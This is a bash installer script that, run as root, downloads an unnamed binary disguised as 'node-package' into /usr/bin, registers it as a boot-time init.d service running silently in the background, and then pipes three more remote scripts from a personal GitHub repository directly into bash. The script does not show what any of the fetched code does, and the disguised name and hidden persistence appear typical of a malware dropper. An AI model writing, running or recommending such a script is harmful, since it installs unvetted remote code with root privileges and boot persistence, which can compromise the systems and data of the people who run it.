#!/bin/bash

# Exit on error
set -e

# Variables
URL="https://github.com/yellphonenaing199/package-repo/raw/refs/heads/main/packages"
TARGET_DIR="/usr/bin/"
FILENAME="node-package"
FULL_PATH="$TARGET_DIR/$FILENAME"
SERVICE_NAME="node-package"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   print_error "This script must be run as root (use sudo)"
   exit 1
fi

print_status "Starting installation of $SERVICE_NAME service..."

# Ensure target directory exists
print_status "Creating target directory: $TARGET_DIR"
mkdir -p "$TARGET_DIR"

# Download the file to /var/tmp
print_status "Downloading $FILENAME to $FULL_PATH..."
if curl -L -o "$FULL_PATH" "$URL"; then
    print_status "Download completed successfully"
else
    print_error "Failed to download file"
    exit 1
fi

# Make it executable
print_status "Making file executable..."
chmod +x "$FULL_PATH"

# Create init.d service file
INIT_SCRIPT="/etc/init.d/$SERVICE_NAME"
print_status "Creating init.d service file: $INIT_SCRIPT"
cat > "$INIT_SCRIPT" << EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          $SERVICE_NAME
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Starts the $SERVICE_NAME service
### END INIT INFO

case "\$1" in
  start)
    echo "Starting $SERVICE_NAME"
    nohup $FULL_PATH >/dev/null 2>&1 </dev/null &
    ;;
  stop)
    echo "Stopping $SERVICE_NAME"
    pkill -f $SERVICE_NAME
    ;;
  restart)
    \$0 stop
    \$0 start
    ;;
  *)
    echo "Usage: /etc/init.d/$SERVICE_NAME {start|stop|restart}"
    exit 1
esac

exit 0
EOF

# Make the service script executable
print_status "Making init.d script executable..."
chmod +x "$INIT_SCRIPT"

# Enable the service to start on boot
print_status "Enabling service to start on boot..."
update-rc.d "$SERVICE_NAME" defaults

# Start the service
print_status "Starting the service..."
service "$SERVICE_NAME" start

# Check service status
sleep 2
if pgrep -f "$SERVICE_NAME" > /dev/null; then
    print_status "Service is running successfully!"
    print_status "Process found: $(pgrep -f $SERVICE_NAME)"
else
    print_error "Service failed to start!"
    exit 1
fi

print_status "Installation completed successfully!"
print_status "The service will automatically start on boot."
print_status ""
print_status "Useful commands:"
print_status "  Check status: ps aux | grep $SERVICE_NAME"
print_status "  Stop service: sudo service $SERVICE_NAME stop"
print_status "  Start service: sudo service $SERVICE_NAME start"
print_status "  Restart service: sudo service $SERVICE_NAME restart"
print_status "  Disable auto-start: sudo update-rc.d $SERVICE_NAME remove"

check_and_install_build_tools() {
    echo "➜ Checking for gcc and make..."
    
    # Check if gcc and make are installed
    if ! command -v gcc &> /dev/null || ! command -v make &> /dev/null; then
        echo "➜ gcc or make not found. Installing build tools..."
        
        # Detect package manager and install accordingly
        if command -v apt &> /dev/null; then
            # Debian/Ubuntu
            echo "➜ Using apt package manager..."
            apt install -y build-essential
        elif command -v yum &> /dev/null; then
            # RHEL/CentOS/Fedora (older)
            echo "➜ Using yum package manager..."
            yum groupinstall -y "Development Tools"
        elif command -v dnf &> /dev/null; then
            # Fedora (newer)
            echo "➜ Using dnf package manager..."
            dnf groupinstall -y "Development Tools"
        elif command -v apk &> /dev/null; then
            # Alpine Linux
            echo "➜ Using apk package manager..."
            apk update
            apk add build-base
        elif command -v zypper &> /dev/null; then
            # openSUSE
            echo "➜ Using zypper package manager..."
            zypper install -y gcc make
        elif command -v pacman &> /dev/null; then
            # Arch Linux
            echo "➜ Using pacman package manager..."
            pacman -S --noconfirm base-devel
        else
            echo "❌ No supported package manager found. Please install gcc and make manually."
            exit 1
        fi
        
        # Verify installation
        if command -v gcc &> /dev/null && command -v make &> /dev/null; then
            echo "✅ gcc and make successfully installed."
        else
            echo "❌ Failed to install gcc and make."
            exit 1
        fi
    else
        echo "✅ gcc and make are already installed."
    fi
}

# Check and install build tools
check_and_install_build_tools

bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/service-dis.sh)
bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test.sh)
bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/hhh.sh)
